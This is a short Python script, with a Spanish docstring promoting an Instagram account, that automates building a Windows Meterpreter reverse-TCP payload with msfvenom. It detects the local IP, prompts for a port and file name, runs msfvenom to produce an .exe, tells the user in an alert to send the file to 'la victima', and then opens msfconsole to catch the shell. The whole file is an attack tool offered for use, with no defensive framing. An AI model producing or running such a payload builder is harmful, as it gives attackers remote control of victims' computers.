"""
Hola dragones...

Aqui podran crear el paquete,
no me hago responsable de lo que hagan
con el codigo.

sigan a TDI en instagram

@tdi_colombia

"""
import os
import pyautogui as pg
import socket


try:  
    #Obtener IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    print(ip)

    #Obtener el puerto
    port = pg.prompt("Puerto")
    print(" [*] Puerto: ", port)
    
    #Ponerle un nombre a la aplicación paquete
    name = pg.prompt("Nombre aplicación")
    print(" [*] Nombre aplicación: ", name)

    #Comando de consola Venom (Para crear el paquete)
    venom = str("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + str(ip) + " LPORT=" + str(port) + " -f exe -o " + str(name) + ".exe")

    print(" [*] Venom command: ", venom)
    try:
        os.system(venom)
        pg.alert(text='exe creado. Envialo a la victima', title='Paquete', button='OK')
        os.system("msfconsole")
        
    except:
        pg.alert(text='Error al crear el archivo', title='Error', button='OK')

except:
    pg.alert(text='Error', title='Error', button='OK')
